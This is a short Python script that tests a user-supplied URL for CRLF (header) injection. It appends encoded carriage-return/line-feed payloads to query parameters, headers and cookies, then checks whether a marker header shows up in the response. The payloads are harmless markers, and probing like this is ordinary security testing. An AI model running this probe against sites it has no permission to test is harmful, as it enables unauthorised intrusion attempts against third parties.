import requests

# Define custom CRLF injection payloads
crlf_payloads = ["%0d%0aInjected-Header: TestValue", "%0aInjected-Header: AnotherValue"]

# Define a list of parameters, headers, and cookies to test
params = {"param": "test"}
headers = {"User-Agent": "Mozilla/5.0"}
cookies = {"session": "abcd1234"}

# Prompt the user for the target URL
url = input("Enter the target URL (e.g., http://example.com/vulnerable_endpoint): ").strip()

# Function to send a request with CRLF payloads injected into different parts
def send_injection_requests():
    for payload in crlf_payloads:
        # Inject payload into parameters
        injected_params = {k: v + payload for k, v in params.items()}
        print(f"\nTesting with payload in parameters: {injected_params}")
        response = requests.get(url, params=injected_params, headers=headers, cookies=cookies)
        observe_response(response)

        # Inject payload into headers
        injected_headers = {k: v + payload for k, v in headers.items()}
        print(f"\nTesting with payload in headers: {injected_headers}")
        response = requests.get(url, params=params, headers=injected_headers, cookies=cookies)
        observe_response(response)

        # Inject payload into cookies
        injected_cookies = {k: v + payload for k, v in cookies.items()}
        print(f"\nTesting with payload in cookies: {injected_cookies}")
        response = requests.get(url, params=params, headers=headers, cookies=injected_cookies)
        observe_response(response)

# Function to observe and analyze the response for injection success indicators
def observe_response(response):
    print(f"Status Code: {response.status_code}")
    print("Response Headers:")
    for header, value in response.headers.items():
        print(f"{header}: {value}")
    
    # Check if injected header appears in the response
    if "Injected-Header" in response.text or "Injected-Header" in response.headers:
        print("[!] Possible CRLF Injection detected!")
    else:
        print("No CRLF injection found.")

# Run the injection tests
send_injection_requests()
